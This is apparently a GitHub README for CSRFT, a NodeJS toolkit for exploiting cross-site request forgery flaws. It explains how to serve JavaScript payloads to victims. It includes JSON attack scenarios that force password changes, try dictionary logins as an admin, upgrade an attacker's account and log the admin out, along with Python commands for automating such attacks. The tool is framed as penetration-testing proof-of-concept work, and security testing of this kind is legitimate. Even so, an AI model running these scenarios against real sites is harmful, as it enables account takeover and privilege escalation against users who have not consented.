CSRFT - Cross Site Request Forgeries (Exploitation) Toolkit
========

### Introduction
![](https://raw.github.com/PaulSec/CSRFT/master/images/csrft_example.png)

### Description 

This project has been developed to exploit CSRF Web vulnerabilities and provide you a quick and easy exploitation toolkit. 
In few words, this is a simple HTTP Server in NodeJS that will communicate with the clients (victims) and send them payload that will be executed using JavaScript. 

This has been developed entirely in NodeJS, and configuration files are in JSON format. <br />
**However, there's a tool in Python in ```utils``` folder that you can use to automate CSRF exploitation. **

This project allows you to perform PoC (Proof Of Concepts) really easily. Let's see how to get/use it.<br />

### How to get/use the tool

First, clone it : 

```
$ git clone git@github.com:PaulSec/CSRFT.git
```

Then, in the directory, launch the server.js : 

```
$ node server.js
```

Usage will be displayed : 

```
Usage : node server.js <file.json> <port : default 8080>
```

### More information

By default, the server will be launched on the port 8080, so you can access it via : ```http://0.0.0.0:8080```.  
The JSON file must describe your several attack scenarios. 
It can be wherever you want on your hard drive. 

The index page displayed on the browser is accessible via : ```/views/index.ejs```. <br />
You can change it as you want and give the link to your victim.

### Different folders : What do they mean ?

The idea is to provide a 'basic' hierarchy (of the folders) for your projects. 
I made the script quite modular so your configuration files/malicious forms, etc. don't have to be in those folders though. 
This is more like a good practice/advice for your future projects. 

However, here is a little summary of those folders :

* ```conf folder``` : add your JSON configuration file with your configuration. <br />
* ```exploits folder``` : add all your *.html files containing your forms
* ```public folder``` : containing jquery.js and inject.js (script loaded when accessing 0.0.0.0:8080)
* ```views folder``` : index file and exploit template
* ```dicos``` : Folder containing all your dictionnaries for those attacks
* ```lib``` : libs specific for my project (custom ones)
* ```utils``` : folder containing utils such as : csrft_utils.py which will launch CSRFT directly.
* ```server.js``` file - the HTTP server

### Configuration file templates 

#### GET Request with special value

Here is a basic example of JSON configuration file that will target **www.vulnerable.com** 
This is a *special value* because the malicious payload is already in the URL/form. 

```
{
  "audit": {
    "name": "PoC done with Automatic Tool", 
    "scenario": [
      {
        "attack": [
          {
            "method": "GET", 
            "type_attack": "special_value", 
            "url": "http://www.vulnerable.com/changePassword.php?newPassword=csrfAttacks"
          }
        ]
      }
    ]
  }
}
```

#### GET Request with dictionnary attack

Here is a basic example of JSON configuration file. 
For every entry in the dictionnary file, there will be a HTTP Request done. 

```
{
  "audit": {
    "name": "PoC done with Automatic Tool", 
    "scenario": [
      {
        "attack": [
          {
            "file": "./dicos/passwords.txt", 
            "method": "GET", 
            "type_attack": "dico", 
            "url": "http://www.vulnerable.com/changePassword.php?newPassword=<%value%>"
          }
        ]
      }
    ]
  }
}
```

#### POST Request with special value attack

```
{
  "audit": {
    "name": "PoC done with Automatic Tool", 
    "scenario": [
      {
        "attack": [
          {
            "form": "/tmp/csrft/form.html", 
            "method": "POST", 
            "type_attack": "special_value"
          }
        ]
      }
    ]
  }
}
```

The form already includes the malicious payload. 
So it just has to be executed by the victim.

I hope you understood the principles. 
I didn't write an example for a POST with dictionnary attack because there will be one in the next section. 

### Ok but what do Scenario and Attack mean ? 

A scenario is composed of attacks. 
Those attacks can be **simultaneous** or at different time. 

For example, you want to sign the user in and **THEN**, you want him to perform some unwanted actions. 
You can specify it in the JSON file. 

Let's take an example with both POST and GET Request :

```
{
    "audit": {
        "name": "DeepSec | Login the admin, give privilege to the Hacker and log him out",

        "scenario": [
            {
                "attack": [
                    {
                        "method": "POST",
                        "type_attack": "dico",
                        "file": "passwords.txt",
                        "form": "deepsec_form_log_user.html",
                        "comment": "attempt to connect the admin with a list of selected passwords"
                    }
                ]
            },
            {
                "attack": [
                    {
                        "method": "GET",
                        "type_attack": "special_value",
                        "url": "http://192.168.56.1/vuln-website/index.php/welcome/upgrade/27",
                        "comment": "then, after the login session, we expect the admin to be logged in, attempt to upgrade our account"
                    }
                ]
            },          
            {
                "attack": [
                    {
                        "method": "GET",
                        "type_attack": "special_value",
                        "url": "http://192.168.56.1/vuln-website/index.php/welcome/logout",
                        "comment": "The final step is to logout the admin"
                    }
                ] 
            }   
        ]
    }
}
```

You can now define some "steps", different attacks that will be executed in a certain order. 

### Use cases 

#### A) I want to write my specific JSON configuration file and launch it by hand

Based on the templates which are available, you can easily create your own.
If you have any trouble creating it, feel free to contact me and I'll try to help you as much as I can but it shoudn't be this complicated.

**Steps to succeed :**

**1)** Create your configuration file, see samples in ```conf/``` folder<br />
**2)** Add your .html files in the ```exploits/``` folder with the different payloads if the CSRF is POST vulnerable<br />
**3)** If you want to do Dictionnary attack, add your dictionnary file to the ```dicos/``` folder,<br />
**4)** Replace the value of the field you want to perform this attack with the token ```<%value%>``` <br />
      => either in your urls if GET exploitation, or in the HTML files if POST exploitation. <br />
**5)** Launch the application : ```node server.js conf/test.json```<br />


#### B) I want to automate attacks really easily

To do so, I developed a Python script **csrft_utils.py** in ```utils``` folder that will do this for you. 

Here are some basic use cases :

**GET parameter with Dictionnary attack : **

```
$ python csrft_utils.py --url="http://www.vulnerable.com/changePassword.php?newPassword=csvulnerableParameter" --param=newPassword --dico_file="../dicos/passwords.txt"
```

**POST parameter with Special value attack : **

```
$ python csrft_utils.py --form=http://website.com/user.php --id=changePassword --param=password password=newPassword --special_value
```

### Conclusion

This project has been released under License GPLv3. 
Feel free to contribute, send me feedbacks, or even fork the project !

It's still under development so there might be some bugs. Report it and I'll fix it as soon as possible. 
